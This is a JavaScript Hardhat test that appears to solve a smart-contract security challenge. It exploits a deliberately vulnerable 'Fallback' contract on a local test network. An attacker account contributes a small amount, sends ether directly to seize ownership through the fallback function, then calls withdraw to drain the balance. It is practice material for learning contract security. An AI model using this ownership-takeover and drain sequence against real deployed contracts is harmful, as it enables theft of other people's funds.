const { expect } = require("chai");

describe("Token contract", function () {
  it("Deployment should work, n'est pas?", async function () {

    var assert = require('assert');

    const ContractFactory = await ethers.getContractFactory('Fallback');
    // send 1 wei when contract init
    const overrides = { value: ethers.utils.parseUnits("1", "wei")} ;
    const contract = await ContractFactory.deploy(overrides); //"meep",{value: { BigNumber: "1" }});
    await contract.deployed();
  
    console.log('Contract deployed to:', contract.address);
  
    const [owner, attacker] = await ethers.getSigners();
    console.log(`Owner address : ${owner.address}`);
    console.log(`Attacker address ${attacker.address}`);

    // Verify contract balance is 1 (from original deployment)
    const initbalance = await contract.provider.getBalance(contract.address);
    assert(initbalance.toString() === '1', 'Balance is unexpected');
    console.log(`Initial balance : ${initbalance} wei`);
    
    // Attacker to send some ether to contribute()
    console.log(`Attacker to send some ether to contribute()`);
    await contract.connect(attacker).contribute({ value: 1 });

    // Verify contract balance is 2 now
    const contribbalance = await contract.provider.getBalance(contract.address);
    assert(contribbalance.toString() === '2', 'Balance is unexpected');
    console.log(`After contrib balance : ${contribbalance} wei`);
    
    // Send some ether to the fallback function will make attacker the owner.
    // Fallback function - https://www.geeksforgeeks.org/solidity-fall-back-function/
    console.log(`Sending 1 wei to fallback function to take ownership!`);
    await attacker.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseUnits('1', 'wei')
    });
  
    // Check the owner
    const contractOwner = await contract.owner();
    assert(contractOwner === attacker.address, 'Attacker failed to get ownership');
    console.log(`I am now owner!`);

    // Verify contract balance is 3
    const interimbalance = await contract.provider.getBalance(contract.address);
    assert(interimbalance.toString() === '3', 'Balance is unexpected');
    console.log(`Interim balance : ${interimbalance} wei`);
    
    // Make withdraw to take all money
    const tx = await contract.connect(attacker).withdraw();
    tx.wait();
  
    // Verify contract balance is 0
    const balance = await contract.provider.getBalance(contract.address);
    assert(balance.toString() === '0', 'Balance is not empty!');
    console.log(`Final balance : ${balance} wei`);
    
    expect(balance.toString()).to.equal('0');
  });
});